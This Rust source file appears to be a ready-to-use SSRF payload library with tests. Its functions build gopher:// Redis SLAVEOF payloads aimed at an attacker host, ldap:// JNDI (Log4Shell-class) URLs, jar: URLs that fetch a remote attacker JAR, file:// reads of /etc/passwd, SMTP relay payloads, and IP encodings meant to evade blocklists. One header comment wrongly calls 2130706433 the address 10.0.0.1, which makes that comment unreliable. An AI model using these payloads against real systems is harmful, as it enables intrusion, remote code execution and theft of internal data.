//! SSRF scheme-confusion payload library.
//!
//! SSRF rules usually focus on `http://` and `https://`. Everything
//! else slips. Each non-HTTP scheme that the target's URL fetcher
//! supports is a separate attack vector — most security tools never
//! probe them.
//!
//! Library scheme support (varies by language):
//!
//! | Scheme | Java URL | Python urllib | curl | PHP fopen | Ruby OpenURI |
//! |---|---|---|---|---|---|
//! | `http://`  | ✓ | ✓ | ✓ | ✓ | ✓ |
//! | `file://`  | ✓ | ✓ | ✓ | ✓ | ✓ |
//! | `ftp://`   | ✓ | ✓ | ✓ | ✓ | ✓ |
//! | `gopher://`| ✗ | (3rd party) | ✓ | (3rd party) | ✓ |
//! | `dict://`  | ✗ | ✗ | ✓ | ✗ | ✗ |
//! | `ldap://`  | ✓ | ✗ | ✓ | ✗ | ✗ |
//! | `jar://`   | ✓ | ✗ | ✗ | ✗ | ✗ |
//! | `netdoc://`| ✓ | ✗ | ✗ | ✗ | ✗ |
//! | `tftp://`  | ✗ | ✗ | ✓ | ✗ | ✗ |
//! | `smtp://`  | ✗ | ✗ | ✓ | ✗ | ✗ |
//!
//! Coverage:
//!
//! - **`gopher://`** — universal protocol injection. Encode any
//!   wire bytes as `%XX` and gopher will send them verbatim to the
//!   target host:port — Redis RCE, memcached CRLF, SMTP relay, etc.
//! - **`dict://`** — memcached / Redis-as-dict-server bypass.
//! - **`file://`** — local file read with relative + absolute paths.
//! - **`ldap://`** — Java RCE via JNDI lookup (Log4Shell class).
//! - **`jar://`** — Java extracts a remote ZIP / JAR, gives RCE
//!   via specially-crafted JAR manifest.
//! - **`netdoc://`** — Java SSRF that bypasses some scheme blocklists.
//! - **`tftp://`** — UDP-based; many WAFs don't classify.
//! - **`smtp://`** — direct SMTP relay (open MX abuse).
//! - **DNS rebinding shapes** — same library, but the resolved IP
//!   flips between policy check and fetch.
//! - **Decimal / hex / octal IP** representations — `2130706433`
//!   (10.0.0.1 in decimal) defeats IP-shape blocklists.

/// Build a `gopher://` payload that sends `wire_bytes` to
/// `host:port`. The wire bytes are URL-encoded per gopher protocol.
///
/// Classic Redis RCE example: `wire_bytes = "*3\r\n$3\r\nSET\r\n
/// $1\r\nx\r\n$N\r\n<payload>\r\n*4\r\n$6\r\nCONFIG\r\n..."`.
#[must_use]
pub fn gopher(host: &str, port: u16, wire_bytes: &[u8]) -> String {
    let encoded: String = wire_bytes
        .iter()
        .map(|b| format!("%{:02x}", b))
        .collect();
    format!("gopher://{host}:{port}/_{encoded}")
}

/// Build a `gopher://` Redis SLAVEOF payload — points the target's
/// Redis at the attacker's "Redis" (which is just a TCP listener
/// that returns dump.rdb content).
#[must_use]
pub fn gopher_redis_slaveof(host: &str, port: u16, attacker_ip: &str, attacker_port: u16) -> String {
    let wire = format!(
        "*3\r\n$7\r\nSLAVEOF\r\n${}\r\n{}\r\n${}\r\n{}\r\n",
        attacker_ip.len(),
        attacker_ip,
        attacker_port.to_string().len(),
        attacker_port
    );
    gopher(host, port, wire.as_bytes())
}

/// Build a `dict://` memcached `stats` probe (info disclosure).
#[must_use]
pub fn dict_memcached_stats(host: &str, port: u16) -> String {
    format!("dict://{host}:{port}/stats")
}

/// Build a `dict://` Redis `INFO` probe (info disclosure).
#[must_use]
pub fn dict_redis_info(host: &str, port: u16) -> String {
    format!("dict://{host}:{port}/INFO")
}

/// Build a `file://` payload.
#[must_use]
pub fn file_read(path: &str) -> String {
    format!("file://{path}")
}

/// Build a `file://` payload with the localhost authority (`file://localhost/...`)
/// for parsers that require an authority component.
#[must_use]
pub fn file_read_localhost(path: &str) -> String {
    format!("file://localhost{path}")
}

/// Build an `ldap://` JNDI-lookup payload — the Log4Shell class.
/// When loaded by Java JNDI (Log4j, JDK pre-8u121), the target
/// fetches the URL, resolves a Reference, downloads a serialized
/// Object, and deserializes it.
#[must_use]
pub fn ldap_jndi(attacker_host: &str, attacker_port: u16, ref_name: &str) -> String {
    format!("ldap://{attacker_host}:{attacker_port}/{ref_name}")
}

/// Build a `jar://` payload. Java's URL handler fetches a remote
/// JAR, opens an inner entry; the JAR's manifest can chain to a
/// `Main-Class` for RCE on older `java.net.JarURLConnection` paths.
#[must_use]
pub fn jar_remote(remote_jar_url: &str, inner_path: &str) -> String {
    format!("jar:{remote_jar_url}!/{inner_path}")
}

/// Java-specific `netdoc://` (bypasses some scheme blocklists).
#[must_use]
pub fn netdoc(path: &str) -> String {
    format!("netdoc://{path}")
}

/// `tftp://` payload — UDP, many WAFs miss.
#[must_use]
pub fn tftp(host: &str, port: u16, file: &str) -> String {
    format!("tftp://{host}:{port}/{file}")
}

/// `smtp://` direct relay via SSRF.
#[must_use]
pub fn smtp_relay(host: &str, port: u16, from: &str, to: &str, body: &str) -> String {
    let cmds = format!(
        "EHLO attacker\r\nMAIL FROM:<{from}>\r\nRCPT TO:<{to}>\r\nDATA\r\n{body}\r\n.\r\n"
    );
    let encoded: String = cmds.bytes().map(|b| format!("%{:02x}", b)).collect();
    format!("smtp://{host}:{port}/_{encoded}")
}

/// Build a decimal-IP variant of an IP address. `10.0.0.1` ->
/// `167772161`. Defeats blocklists that match on dotted-quad form.
#[must_use]
pub fn decimal_ip(a: u8, b: u8, c: u8, d: u8) -> String {
    let n: u32 =
        (a as u32) * 16_777_216 + (b as u32) * 65_536 + (c as u32) * 256 + (d as u32);
    n.to_string()
}

/// Build a hex-IP variant. `10.0.0.1` -> `0xa000001`. Most parsers
/// understand this.
#[must_use]
pub fn hex_ip(a: u8, b: u8, c: u8, d: u8) -> String {
    let n: u32 =
        (a as u32) * 16_777_216 + (b as u32) * 65_536 + (c as u32) * 256 + (d as u32);
    format!("0x{:x}", n)
}

/// Build an octal-IP variant. `127.0.0.1` -> `0177.0.0.01`. Some
/// parsers honor.
#[must_use]
pub fn octal_ip(a: u8, b: u8, c: u8, d: u8) -> String {
    format!("0{:o}.0{:o}.0{:o}.0{:o}", a, b, c, d)
}

/// Build a mixed-base-IP variant. Some parsers accept any
/// combination per octet.
#[must_use]
pub fn mixed_base_ip() -> &'static str {
    "0x7f.0.0.1"
}

/// IPv6 IPv4-mapped form — `::ffff:10.0.0.1` — bypasses some SSRF
/// guards that check IPv4 ranges only.
#[must_use]
pub fn ipv4_mapped_ipv6(a: u8, b: u8, c: u8, d: u8) -> String {
    format!("[::ffff:{a}.{b}.{c}.{d}]")
}

/// IPv6 6to4 form — `2002:WWXX:YYZZ::` where WWXX:YYZZ encodes the
/// IPv4. Bypasses guards that filter `::ffff:` but not `2002:`.
#[must_use]
pub fn ipv6_6to4(a: u8, b: u8, c: u8, d: u8) -> String {
    format!("[2002:{:02x}{:02x}:{:02x}{:02x}::]", a, b, c, d)
}

/// One-shot fan-out: every scheme + IP-shape SSRF variant.
#[must_use]
pub fn all_ssrf_schemes(
    attacker_host: &str,
    attacker_port: u16,
    internal_ip: (u8, u8, u8, u8),
) -> Vec<(&'static str, String)> {
    let (a, b, c, d) = internal_ip;
    let dotted = format!("{a}.{b}.{c}.{d}");
    vec![
        ("gopher-redis-slaveof", gopher_redis_slaveof(&dotted, 6379, attacker_host, attacker_port)),
        ("dict-memcached-stats", dict_memcached_stats(&dotted, 11211)),
        ("dict-redis-info", dict_redis_info(&dotted, 6379)),
        ("file-read", file_read("/etc/passwd")),
        ("file-read-localhost", file_read_localhost("/etc/passwd")),
        ("ldap-jndi", ldap_jndi(attacker_host, attacker_port, "Exploit")),
        ("jar-remote", jar_remote(&format!("http://{attacker_host}/x.jar"), "META-INF/MANIFEST.MF")),
        ("netdoc", netdoc("/etc/passwd")),
        ("tftp", tftp(&dotted, 69, "secret.txt")),
        (
            "smtp-relay",
            smtp_relay(&dotted, 25, "attacker@evil", "victim@target", "Subject: hi\r\n\r\nbody"),
        ),
        ("decimal-ip", format!("http://{}/", decimal_ip(a, b, c, d))),
        ("hex-ip", format!("http://{}/", hex_ip(a, b, c, d))),
        ("octal-ip", format!("http://{}/", octal_ip(a, b, c, d))),
        ("mixed-base", format!("http://{}/", mixed_base_ip())),
        ("ipv4-mapped-v6", format!("http://{}/", ipv4_mapped_ipv6(a, b, c, d))),
        ("ipv6-6to4", format!("http://{}/", ipv6_6to4(a, b, c, d))),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn gopher_basic_format() {
        let p = gopher("h", 80, b"AB");
        assert_eq!(p, "gopher://h:80/_%41%42");
    }

    #[test]
    fn gopher_redis_slaveof_format() {
        let p = gopher_redis_slaveof("10.0.0.1", 6379, "1.1.1.1", 6379);
        assert!(p.starts_with("gopher://10.0.0.1:6379/_"));
        // The wire bytes should encode SLAVEOF.
        assert!(p.to_lowercase().contains("%53%4c%41%56%45%4f%46"));
    }

    #[test]
    fn dict_memcached_format() {
        let p = dict_memcached_stats("10.0.0.1", 11211);
        assert_eq!(p, "dict://10.0.0.1:11211/stats");
    }

    #[test]
    fn dict_redis_format() {
        let p = dict_redis_info("10.0.0.1", 6379);
        assert_eq!(p, "dict://10.0.0.1:6379/INFO");
    }

    #[test]
    fn file_read_format() {
        let p = file_read("/etc/passwd");
        assert_eq!(p, "file:///etc/passwd");
    }

    #[test]
    fn file_read_localhost_format() {
        let p = file_read_localhost("/etc/passwd");
        assert_eq!(p, "file://localhost/etc/passwd");
    }

    #[test]
    fn ldap_jndi_format() {
        let p = ldap_jndi("attacker", 1389, "Exploit");
        assert_eq!(p, "ldap://attacker:1389/Exploit");
    }

    #[test]
    fn jar_remote_format() {
        let p = jar_remote("http://a/x.jar", "META-INF/MANIFEST.MF");
        assert_eq!(p, "jar:http://a/x.jar!/META-INF/MANIFEST.MF");
    }

    #[test]
    fn netdoc_format() {
        let p = netdoc("/etc/passwd");
        assert_eq!(p, "netdoc:///etc/passwd");
    }

    #[test]
    fn tftp_format() {
        let p = tftp("10.0.0.1", 69, "x");
        assert_eq!(p, "tftp://10.0.0.1:69/x");
    }

    #[test]
    fn smtp_relay_url_encoded() {
        let p = smtp_relay("10.0.0.1", 25, "a", "b", "hi");
        assert!(p.starts_with("smtp://10.0.0.1:25/_"));
        // EHLO + CRLF should be in the encoded form.
        assert!(p.contains("%45%48%4c%4f"));
    }

    #[test]
    fn decimal_ip_basic() {
        assert_eq!(decimal_ip(127, 0, 0, 1), "2130706433");
        assert_eq!(decimal_ip(10, 0, 0, 1), "167772161");
    }

    #[test]
    fn hex_ip_basic() {
        assert_eq!(hex_ip(127, 0, 0, 1), "0x7f000001");
        assert_eq!(hex_ip(10, 0, 0, 1), "0xa000001");
    }

    #[test]
    fn octal_ip_basic() {
        // 127 = 0177, 0 = 00, 0 = 00, 1 = 01.
        let p = octal_ip(127, 0, 0, 1);
        assert!(p.starts_with("0177"));
        assert!(p.contains("00"));
        assert!(p.ends_with("01"));
    }

    #[test]
    fn mixed_base_ip_constant() {
        // 0x7f is the only hex octet; rest are decimal.
        let p = mixed_base_ip();
        assert!(p.contains("0x7f"));
    }

    #[test]
    fn ipv4_mapped_ipv6_format() {
        let p = ipv4_mapped_ipv6(127, 0, 0, 1);
        assert_eq!(p, "[::ffff:127.0.0.1]");
    }

    #[test]
    fn ipv6_6to4_format() {
        let p = ipv6_6to4(127, 0, 0, 1);
        assert_eq!(p, "[2002:7f00:0001::]");
    }

    #[test]
    fn ipv6_6to4_imds_address() {
        // 169.254.169.254 -> 2002:a9fe:a9fe::
        let p = ipv6_6to4(169, 254, 169, 254);
        assert_eq!(p, "[2002:a9fe:a9fe::]");
    }

    #[test]
    fn all_ssrf_schemes_count() {
        let v = all_ssrf_schemes("attacker", 4444, (10, 0, 0, 1));
        assert!(v.len() >= 14);
    }

    #[test]
    fn all_ssrf_schemes_unique_names() {
        let v = all_ssrf_schemes("a", 80, (1, 2, 3, 4));
        let names: std::collections::HashSet<&&str> = v.iter().map(|(n, _)| n).collect();
        assert_eq!(names.len(), v.len());
    }

    #[test]
    fn all_schemes_carry_target() {
        let v = all_ssrf_schemes("ATTACKER_MARKER", 4444, (1, 2, 3, 4));
        let any_carries = v.iter().any(|(_, p)| p.contains("ATTACKER_MARKER") || p.contains("1.2.3.4"));
        assert!(any_carries);
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_ssrf_schemes("a", 80, (1, 2, 3, 4));
        let b = all_ssrf_schemes("a", 80, (1, 2, 3, 4));
        assert_eq!(a, b);
    }

    #[test]
    fn gopher_empty_wire_no_panic() {
        let p = gopher("h", 80, &[]);
        assert!(p.ends_with("/_"));
    }

    #[test]
    fn adversarial_long_payload_no_panic() {
        let big = vec![b'A'; 100_000];
        let _ = gopher("h", 80, &big);
        let _ = gopher_redis_slaveof("h", 80, "a", 80);
    }

    #[test]
    fn decimal_ip_zero() {
        assert_eq!(decimal_ip(0, 0, 0, 0), "0");
    }

    #[test]
    fn decimal_ip_max() {
        let n = decimal_ip(255, 255, 255, 255);
        assert_eq!(n, "4294967295");
    }

    #[test]
    fn unicode_in_attacker_host() {
        let p = ldap_jndi("ñ.example", 1389, "x");
        assert!(p.contains("ñ.example"));
    }
}
